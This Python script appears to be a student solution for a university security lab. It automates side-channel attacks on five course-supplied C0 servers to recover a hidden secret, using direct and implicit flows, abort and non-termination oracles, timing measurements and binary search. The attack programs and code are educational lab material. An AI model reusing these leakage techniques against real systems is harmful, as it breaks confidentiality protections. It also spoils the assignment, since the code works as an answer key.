#!/usr/bin/env python3
"""
Automate Lab 2 Part 1 attacks against c0_serve1..c0_serve5.

Run this on linux.andrew.cmu.edu where the staff binaries are available.
"""

from __future__ import annotations

import argparse
import os
import shlex
import statistics
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional

SECRET_BITS = 62
SECRET_MIN = 0
SECRET_MAX_EXCLUSIVE = 1 << SECRET_BITS


DIRECT_FLOW_PROGRAM = """int main(int input, int secret) {
  return secret;
}
"""

IMPLICIT_BOOLEAN_PROGRAM = """int main(int input, int secret) {
  int out = 0;
  if (secret < input) {
    out = 1;
  }
  return out;
}
"""

ABORT_ERROR_ORACLE_PROGRAM = """int main(int input, int secret) {
  if (secret < input) {
    error("leak");
  }
  return 0;
}
"""

ABORT_ASSERT_ORACLE_PROGRAM = """int main(int input, int secret) {
  assert(!(secret < input));
  return 0;
}
"""

ABORT_DIVZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  int x = 1;
  if (secret < input) {
    x = x / 0;
  }
  return 0;
}
"""

ABORT_MODZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  int x = 1;
  if (secret < input) {
    x = x % 0;
  }
  return 0;
}
"""

ABORT_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
  int[] A = alloc_array(int, 1);
  int x = 0;
  if (secret < input) {
    x = A[1];
  }
  return 0;
}
"""

EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  bool witness = (secret < input) && ((1 / 0) == 0);
  return 0;
}
"""

EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  bool witness = (secret < input) && ((1 % 0) == 0);
  return 0;
}
"""

EXPR_ABORT_AND_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
  //@label H;
  int[] A = alloc_array(int, 1);
  //@label H;
  bool witness = (secret < input) && (A[1] == 0);
  return 0;
}
"""

TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
  if (secret < input) {
    while (true) {
    }
  }
  return 0;
}
"""

TERMINATION_ORACLE_ALT_PROGRAM = """int main(int input, int secret) {
  int stop = 0;
  if (secret < input) {
    while (stop == 0) {
    }
  }
  return 0;
}
"""

NOOP_PROGRAM = """int main(int input, int secret) {
  return 0;
}
"""


@dataclass
class QueryResult:
    kind: str
    value: Optional[int]
    elapsed_s: float
    exit_code: Optional[int]
    stdout: str
    stderr: str


class StrategyFailed(Exception):
    pass


def log(msg: str) -> None:
    print(msg, flush=True)


def debug_log(enabled: bool, msg: str) -> None:
    if enabled:
        log(msg)


def parse_server_output(stdout: str, stderr: str) -> tuple[str, Optional[int]]:
    lines: list[str] = []
    if stdout.strip():
        lines.extend(x.strip() for x in stdout.strip().splitlines() if x.strip())
    if stderr.strip():
        lines.extend(x.strip() for x in stderr.strip().splitlines() if x.strip())

    for line in reversed(lines):
        if line.startswith("success "):
            try:
                return "success", int(line.split()[1])
            except Exception:
                return "success", None
        if line.startswith("failure "):
            try:
                return "failure", int(line.split()[1])
            except Exception:
                return "failure", None
        if line in {"error", "abort", "insecure"}:
            return line, None
    if not lines:
        return "no-output", None
    return "unknown", None


def format_result(res: QueryResult) -> str:
    tail = (res.stdout.strip().splitlines()[-1] if res.stdout.strip() else "").strip()
    return (
        f"kind={res.kind} value={res.value} exit={res.exit_code} "
        f"elapsed={res.elapsed_s:.3f}s out={tail!r}"
    )


def run_query(
    *,
    server_command: str,
    userid: str,
    program_path: Path,
    input_value: int,
    timeout_s: float,
) -> QueryResult:
    quoted_user = shlex.quote(userid)
    quoted_program = shlex.quote(str(program_path))
    cmd = f"{server_command} {quoted_user} {quoted_program} {input_value}"
    t0 = time.perf_counter()
    try:
        cp = subprocess.run(
            ["bash", "-lc", cmd],
            text=True,
            capture_output=True,
            timeout=timeout_s,
            check=False,
        )
        elapsed = time.perf_counter() - t0
        kind, value = parse_server_output(cp.stdout, cp.stderr)
        return QueryResult(
            kind=kind,
            value=value,
            elapsed_s=elapsed,
            exit_code=cp.returncode,
            stdout=cp.stdout,
            stderr=cp.stderr,
        )
    except subprocess.TimeoutExpired:
        elapsed = time.perf_counter() - t0
        return QueryResult(
            kind="timeout",
            value=None,
            elapsed_s=elapsed,
            exit_code=None,
            stdout="",
            stderr="",
        )


def estimate_timeout(
    *,
    server_command: str,
    userid: str,
    base_timeout_s: float,
    debug: bool,
) -> float:
    with ProgramFile(NOOP_PROGRAM) as path:
        samples: list[float] = []
        for input_value in (0, SECRET_MAX_EXCLUSIVE):
            for _ in range(2):
                res = run_query(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=input_value,
                    timeout_s=max(base_timeout_s, 1.0),
                )
                if res.kind in {"failure", "success"}:
                    samples.append(res.elapsed_s)
        if not samples:
            estimated = max(base_timeout_s, 2.0)
            debug_log(
                debug,
                f"[calibration] no baseline samples; using timeout {estimated:.2f}s",
            )
            return estimated
        p50 = statistics.median(samples)
        estimated = max(base_timeout_s, min(20.0, p50 * 8.0 + 0.75))
        debug_log(
            debug,
            f"[calibration] baseline median={p50:.4f}s -> timeout {estimated:.2f}s",
        )
        return estimated


class ProgramFile:
    def __init__(self, source: str):
        self.source = source
        self.path: Optional[Path] = None

    def __enter__(self) -> Path:
        fd, raw_path = tempfile.mkstemp(prefix="lab2_attack_", suffix=".c0")
        os.close(fd)
        self.path = Path(raw_path)
        self.path.write_text(self.source, encoding="utf-8")
        return self.path

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        if self.path is not None:
            try:
                self.path.unlink()
            except FileNotFoundError:
                pass


def binary_search_oracle(oracle: Callable[[int], bool]) -> int:
    lo = SECRET_MIN
    hi = SECRET_MAX_EXCLUSIVE
    for _ in range(SECRET_BITS + 2):
        if lo + 1 >= hi:
            break
        mid = (lo + hi) // 2
        if oracle(mid):
            hi = mid
        else:
            lo = mid
    return lo


def recover_direct(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
) -> int:
    with ProgramFile(DIRECT_FLOW_PROGRAM) as path:
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=path,
            input_value=0,
            timeout_s=timeout_s,
        )
        if res.kind == "success" and res.value is not None:
            return res.value
        raise StrategyFailed(f"direct flow unavailable ({format_result(res)})")


def recover_from_failure_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    program_source: str,
) -> int:
    with ProgramFile(program_source) as path:
        def classify(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind == "failure" and res.value in (0, 1):
                return res.value == 1
            raise StrategyFailed(f"oracle unavailable ({format_result(res)})")

        boundary_lo = classify(SECRET_MIN)
        boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
        if boundary_lo or not boundary_hi:
            raise StrategyFailed(
                "boolean-oracle boundary check failed "
                f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
            )
        return binary_search_oracle(classify)


def recover_from_kind_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    program_source: str,
    true_kinds: set[str],
    false_kinds: set[str],
) -> int:
    with ProgramFile(program_source) as path:
        def classify(mid: int) -> bool:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=mid,
                timeout_s=timeout_s,
            )
            if res.kind == "success" and res.value is not None:
                raise StrategyFailed(f"already solved directly: {res.value}")
            if res.kind in true_kinds:
                return True
            if res.kind in false_kinds:
                return False
            raise StrategyFailed(f"oracle unavailable ({format_result(res)})")

        boundary_lo = classify(SECRET_MIN)
        boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
        if boundary_lo or not boundary_hi:
            raise StrategyFailed(
                "kind-oracle boundary check failed "
                f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
            )
        return binary_search_oracle(classify)


def median_runtime_for_input(
    *,
    server_command: str,
    userid: str,
    program_path: Path,
    input_value: int,
    timeout_s: float,
    repeats: int,
) -> float:
    runtimes: list[float] = []
    for _ in range(repeats):
        res = run_query(
            server_command=server_command,
            userid=userid,
            program_path=program_path,
            input_value=input_value,
            timeout_s=timeout_s,
        )
        if res.kind == "success" and res.value is not None:
            raise StrategyFailed(f"already solved directly: {res.value}")
        if res.kind != "failure":
            raise StrategyFailed(f"timing probe rejected ({format_result(res)})")
        runtimes.append(res.elapsed_s)
    return statistics.median(runtimes)


def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
    return f"""int main(int input, int secret) {{
  int warmup = 0;
  while (warmup < {warmup_iters}) {{
    warmup = warmup + 1;
  }}
  //@label H;
  int burn = 0;
  if (secret < input) {{
    while (burn < {burn_iters}) {{
      burn = burn + 1;
    }}
  }}
  return 0;
}}
"""


def make_short_circuit_timing_program(*, term_count: int) -> str:
    term = "((1 + 1) == 2)"
    heavy = " && ".join([term] * term_count)
    return f"""int main(int input, int secret) {{
  //@label H;
  bool burn = (secret < input) && ({heavy});
  return 0;
}}
"""


def recover_from_timing_oracle(
    *,
    server_command: str,
    userid: str,
    timeout_s: float,
    repeats: int,
    debug: bool,
) -> int:
    calibration_repeats = max(5, repeats)
    burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
    sc_term_candidates = [800, 1600, 3200, 6400]
    min_ratio = 1.06
    min_gap_s = 0.010

    candidates: list[tuple[str, str]] = []
    for burn in burn_candidates:
        candidates.append(
            (
                f"loop-burn={burn}",
                make_timing_oracle_program(warmup_iters=1_000_000, burn_iters=burn),
            )
        )
    for term_count in sc_term_candidates:
        candidates.append(
            (
                f"short-circuit-terms={term_count}",
                make_short_circuit_timing_program(term_count=term_count),
            )
        )

    last_failure = "no timing candidates worked"
    for candidate_name, source in candidates:
        with ProgramFile(source) as path:
            try:
                t_false = median_runtime_for_input(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=SECRET_MIN,
                    timeout_s=timeout_s,
                    repeats=calibration_repeats,
                )
                t_true = median_runtime_for_input(
                    server_command=server_command,
                    userid=userid,
                    program_path=path,
                    input_value=SECRET_MAX_EXCLUSIVE,
                    timeout_s=timeout_s,
                    repeats=calibration_repeats,
                )
            except StrategyFailed as e:
                last_failure = str(e)
                debug_log(debug, f"[timing] {candidate_name}: {last_failure}")
                continue

            ratio = t_true / max(t_false, 1e-9)
            gap = t_true - t_false
            debug_log(
                debug,
                f"[timing] {candidate_name}: baseline={t_false:.4f}s true={t_true:.4f}s "
                f"ratio={ratio:.3f} gap={gap:.4f}s",
            )
            if ratio < min_ratio or gap < min_gap_s:
                last_failure = (
                    f"insufficient separation for {candidate_name} "
                    f"(ratio={ratio:.3f}, gap={gap:.4f}s)"
                )
                continue

            threshold = (t_false + t_true) / 2.0

            def classify(mid: int) -> bool:
                # Majority vote improves stability under noisy shared machines.
                votes_true = 0
                votes_total = 3
                for _ in range(votes_total):
                    t_mid = median_runtime_for_input(
                        server_command=server_command,
                        userid=userid,
                        program_path=path,
                        input_value=mid,
                        timeout_s=timeout_s,
                        repeats=repeats,
                    )
                    if t_mid > threshold:
                        votes_true += 1
                return votes_true >= 2

            boundary_lo = classify(SECRET_MIN)
            boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
            if boundary_lo or not boundary_hi:
                last_failure = (
                    "timing boundary check failed "
                    f"for {candidate_name} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
                )
                debug_log(debug, f"[timing] {last_failure}")
                continue

            return binary_search_oracle(classify)

    raise StrategyFailed(last_failure)


def attempt_strategy(
    *,
    server_idx: int,
    name: str,
    func: Callable[[], int],
    debug: bool,
) -> Optional[int]:
    log(f"[serve{server_idx}] trying {name}")
    try:
        return func()
    except StrategyFailed as e:
        debug_log(debug, f"[serve{server_idx}] {name} unavailable: {e}")
        return None


def recover_server_secret(
    *,
    server_idx: int,
    userid: str,
    timeout_s: float,
    timing_timeout_s: float,
    timing_repeats: int,
    debug: bool,
) -> Optional[int]:
    server_command = f"~mfredrik/bin/c0_serve{server_idx}"
    tuned_query_timeout = estimate_timeout(
        server_command=server_command,
        userid=userid,
        base_timeout_s=timeout_s,
        debug=debug,
    )
    tuned_timing_timeout = max(timing_timeout_s, tuned_query_timeout * 2.0)
    debug_log(
        debug,
        f"[serve{server_idx}] using query-timeout={tuned_query_timeout:.2f}s "
        f"timing-timeout={tuned_timing_timeout:.2f}s",
    )
    strategies: list[tuple[str, Callable[[], int]]] = [
        (
            "direct explicit flow",
            lambda: recover_direct(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
            ),
        ),
        (
            "implicit-flow boolean oracle",
            lambda: recover_from_failure_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=IMPLICIT_BOOLEAN_PROGRAM,
            ),
        ),
        (
            "expr abort oracle (&& div0)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (&& mod0)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (&& oob)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_ABORT_AND_OOB_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (error)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_ERROR_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (assert)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_ASSERT_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (divide by zero)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_DIVZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (mod by zero)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_MODZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (oob read)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_OOB_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "nontermination oracle",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=TERMINATION_ORACLE_PROGRAM,
                true_kinds={"timeout"},
                false_kinds={"failure"},
            ),
        ),
        (
            "nontermination oracle (alt loop)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=TERMINATION_ORACLE_ALT_PROGRAM,
                true_kinds={"timeout"},
                false_kinds={"failure"},
            ),
        ),
        (
            "timing oracle",
            lambda: recover_from_timing_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_timing_timeout,
                repeats=timing_repeats,
                debug=debug,
            ),
        ),
    ]

    for strategy_name, strategy_fn in strategies:
        secret = attempt_strategy(
            server_idx=server_idx,
            name=strategy_name,
            func=strategy_fn,
            debug=debug,
        )
        if secret is not None:
            return secret
    return None


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Lab 2 Part 1 secret extractor")
    p.add_argument("--userid", required=True, help="Andrew user id")
    p.add_argument(
        "--servers",
        nargs="+",
        type=int,
        default=[1, 2, 3, 4, 5],
        help="Server indices to attack (default: 1 2 3 4 5)",
    )
    p.add_argument(
        "--outdir",
        default=".",
        help="Directory where flow_serve<n>.txt files are written",
    )
    p.add_argument(
        "--query-timeout",
        type=float,
        default=1.2,
        help="Timeout for non-timing strategies in seconds",
    )
    p.add_argument(
        "--timing-timeout",
        type=float,
        default=12.0,
        help="Timeout for timing strategy measurements in seconds",
    )
    p.add_argument(
        "--timing-repeats",
        type=int,
        default=3,
        help="Repetitions per timing measurement (median is used)",
    )
    p.add_argument(
        "--debug",
        action="store_true",
        help="Print detailed strategy failure diagnostics",
    )
    return p.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    unresolved: list[int] = []

    for idx in args.servers:
        if idx < 1 or idx > 5:
            log(f"[serve{idx}] skipped: invalid server index")
            unresolved.append(idx)
            continue
        secret = recover_server_secret(
            server_idx=idx,
            userid=args.userid,
            timeout_s=args.query_timeout,
            timing_timeout_s=args.timing_timeout,
            timing_repeats=args.timing_repeats,
            debug=args.debug,
        )
        if secret is None:
            log(f"[serve{idx}] not recovered")
            unresolved.append(idx)
            continue
        outfile = outdir / f"flow_serve{idx}.txt"
        outfile.write_text(f"{secret}\n", encoding="utf-8")
        log(f"[serve{idx}] recovered {secret} -> {outfile}")

    if unresolved:
        log(
            "Unresolved servers: "
            + ", ".join(str(i) for i in unresolved)
            + ". One server may be intentionally secure, or timing may need tuning."
        )
        return 2
    log("All requested servers recovered.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
